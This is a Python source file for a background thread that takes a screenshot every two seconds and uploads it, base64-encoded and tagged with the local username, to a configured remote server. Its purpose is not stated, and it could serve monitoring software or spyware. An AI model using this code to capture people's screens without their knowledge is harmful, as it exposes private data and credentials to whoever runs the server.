  # -*- coding: utf-8 -*-

import sys
import os
import cStringIO
import time
import base64
from contextlib import closing
import defines
import threading
import logger
import config

log = None

class Screenshoter(threading.Thread):
    def __init__(self, selfdir):
        threading.Thread.__init__(self)
        self.selfdir = selfdir
        self.datadir = os.path.expandvars(config.DATADIR)
        self.url = config.URL + '/image'
        global log
        log = logger.Logger(os.path.join(self.datadir, 'logs/~screens.log'), 'screenshoter')
        self.daemon = False
        self.quality = 30        
        self.active = False 
        self.cookie = {"username": defines.getUserName()} 
        
        defines.makedirs(self.datadir)      
        
        
    def stop(self):
        self.active = False
        
        
    def run(self): 
        from PIL import ImageGrab
        self.active = True
        while self.active:
            try:
                defines.makedirs(self.datadir)
                img = ImageGrab.grab()        
                with closing(cStringIO.StringIO()) as fp:       
                    img.save(fp, "JPEG", quality=self.quality) 
                    data = {'data': base64.urlsafe_b64encode(fp.getvalue())}
                    defines.GET(self.url, post=data, cookie=self.cookie)                
            
            except Exception as e:
                log.exception(e)
            
            time.sleep(2)
        
if __name__ == "__main__":
    selfdir = os.path.abspath(os.path.dirname(__file__))
    Screenshoter(selfdir).start()
            
             
        
        
